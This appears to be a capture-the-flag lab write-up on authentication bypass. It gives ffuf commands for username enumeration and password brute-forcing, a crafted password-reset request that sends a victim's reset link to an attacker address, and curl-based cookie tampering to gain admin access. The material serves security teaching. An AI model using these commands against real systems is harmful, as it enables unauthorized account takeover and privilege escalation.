![image](https://github.com/user-attachments/assets/6ff2de4c-16d6-4f67-ac3d-6d15c1d3f28e)



# Room Summary: Authentication Bypass


## ✅ Task 2: Username Enumeration

### 🧠 Objective:
Identify valid usernames by analyzing the web application's response messages during registration attempts.

### 🛠️ Technique:
- The signup form returns a **distinct error message** if a username already exists:
  ```
  username already exists
  ```
- We use this behavior to enumerate valid usernames from a wordlist.

### 🧪 Tool Used:
- [`ffuf`](https://github.com/ffuf/ffuf) – a fast web fuzzer.

### 🔍 Command:
```bash
ffuf -w usernames.txt -X POST -d "username=FUZZ&password=Test123&confirm_password=Test123" -H "Content-Type: application/x-www-form-urlencoded" -u http://<MACHINE_IP>/register -mc all
```

### ✅ Filtering:
Look for responses **containing the error message** or different length/status.

### 📌 Outcome:
Identify valid usernames that can be used in brute-force attacks.

---

## ✅ Task 3: Brute Force

### 🧠 Objective:
Brute-force login credentials using valid usernames and a password wordlist.

### 🛠️ Technique:
Try all combinations of identified usernames with common passwords until the login succeeds.

### 🧪 Tool Used:
- `ffuf` (again).

### 🔍 Command:
```bash
ffuf -w users.txt:USER -w passwords.txt:PASS -u http://<MACHINE_IP>/login -X POST -d "username=USER&password=PASS" -H "Content-Type: application/x-www-form-urlencoded" -mc 200
```

### 📌 Notes:
- Success is indicated by **HTTP 200 OK** with a different response size or message.
- Use double wordlists with `-w` for username-password pairs.

### 📌 Outcome:
Credentials to access a user account.

---

## ✅ Task 4: Logic Flaw in Password Reset

### 🧠 Objective:
Exploit a logic flaw in the password reset mechanism to gain access to another user’s account.

### 🛠️ Technique:
- The password reset feature is vulnerable due to poor separation of GET and POST parameters.
- The **GET parameter** is used to fetch the account, while the **POST parameter** is used to send the email with the reset link.

### 🧪 Exploitation Steps:
1. Navigate to:
   ```
   http://<MACHINE_IP>/reset-password?email=victim@target.com
   ```
2. Intercept the POST request when submitting the form.
3. **Modify the `email` parameter in the POST body** to your own address:
   ```http
   POST /reset-password?email=victim@target.com HTTP/1.1
   Host: <MACHINE_IP>
   ...
   email=attacker@yourdomain.com
   ```
4. The reset link for the victim is sent to the attacker’s email.

### 📌 Outcome:
Password reset link for the victim’s account is sent to the attacker. You reset and gain access.

---

## ✅ Task 5: Cookie Tampering

### 🧠 Objective:
Escalate privileges by manipulating session cookies.

### 🛠️ Technique:
The application uses cookies like:
- `logged_in=true`
- `admin=false`

These can be manipulated to gain unauthorized access.

### 🧪 Steps:
1. **Access a normal user account** and inspect cookies.
2. Modify cookies manually using browser DevTools or `curl`.

### 🔍 Example with curl:
```bash
curl -b "logged_in=true; admin=true" http://<MACHINE_IP>/admin
```

3. If access is granted, the application doesn’t validate cookie values securely.

### 🧠 Advanced:
Some cookies might be hashed or encoded (e.g., MD5, SHA-1). You may need to:
- Decode or brute-force hashes.
- Identify weak cryptographic implementations.

### 📌 Outcome:
- Privilege escalation to admin.
- Understanding of insecure cookie handling.

---

## 🔚 Conclusion

This room teaches core web security weaknesses:

| Task | Focus                         | Vulnerability Type             |
|------|-------------------------------|--------------------------------|
| 2    | Username Enumeration          | Information Disclosure         |
| 3    | Brute-force Login             | Lack of Rate Limiting/Lockout  |
| 4    | Password Reset Logic Flaw     | Business Logic Flaw            |
| 5    | Cookie Tampering              | Insecure Session Management    |

---

## 🧠 Tip:
Always test for logic flaws, examine cookies, and pay attention to error messages—they often leak valuable information!
